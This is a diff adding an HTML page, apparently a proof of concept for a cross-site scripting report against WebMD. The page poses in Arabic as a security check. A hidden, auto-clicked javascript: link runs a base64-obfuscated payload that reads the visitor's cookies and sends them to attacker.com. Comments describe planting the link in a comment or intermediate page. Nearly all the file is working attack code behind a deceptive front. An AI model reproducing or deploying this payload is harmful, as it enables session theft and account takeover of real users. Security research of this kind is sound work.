@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث أمني مهم - WebMD</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .button { padding: 15px 30px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>جاري التحقق من أمان حسابك...</h2>
+    <p>يرجى الانتظار ثانية واحدة، إذا لم يتم توجيهك تلقائياً اضغط بالأسفل.</p>
+    
+    <a id="exploitLink" href="javascript:eval(atob('dmFyIGM9ZG9jdW1lbnQuY29va2llOyBuZXcgSW1hZ2UoKS5zcmM9J2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9JytidG9hKGMpOyBhbGVydCgnWFNTIFN1Y2Nlc3NcbiBEYXRhIFNlbnQgdG8gQXR0YWNrZXIuY29tXG4nICsgYyk7'))//?mmtrack=1-2-3-4-5-6-7" style="display:none;"></a>
+
+    <script>
+        // بمجرد تحميل الصفحة، سيتم توجيه المستخدم لموقع WebMD
+        // ثم الضغط تلقائياً على الرابط الملغم لتفعيل دالة track()
+        window.onload = function() {
+            // ملاحظة: في هجوم حقيقي، سنقوم بتوجيه المستخدم أولاً لصفحة WebMD تحتوي على الرابط
+            // هنا سنقوم بمحاكاة الضغط فوراً لإثبات أن السكريبت في WebMD سينفذ الكود
+            console.log("إرسال الـ Payload...");
+            const link = document.getElementById('exploitLink');
+            
+            // محاكاة استدعاء الدالة من موقع WebMD
+            // في التقرير، اشرح أن المهاجم سيضع هذا الرابط في تعليق أو صفحة وسيطة
+            link.click(); 
+        };
+    </script>
+</body>
+</html>
